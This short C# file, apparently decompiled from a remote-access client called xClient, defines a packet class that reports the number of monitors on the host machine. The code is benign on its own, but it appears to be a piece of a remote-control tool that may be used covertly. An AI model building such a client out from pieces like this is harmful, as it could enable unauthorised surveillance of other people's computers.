using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetMonitorsResponse : GInterface4
{
	public int Number { get; set; }

	public GetMonitorsResponse()
	{
	}

	public GetMonitorsResponse(int number)
	{
		Number = number;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
